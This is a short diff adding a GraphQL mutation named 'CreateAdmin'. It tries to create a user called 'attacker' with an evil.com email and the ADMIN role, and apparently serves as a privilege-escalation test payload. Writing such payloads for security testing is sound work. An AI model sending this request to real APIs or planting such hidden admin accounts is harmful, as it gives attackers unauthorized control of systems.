@@ -1,0 +1,10 @@
+mutation CreateAdmin {
+  createUser(input: {
+    name: "attacker"
+    email: "attacker@evil.com"
+    role: ADMIN
+    tags: ["admin", "superuser"]
+  }) {
+    id name email role
+  }
+}
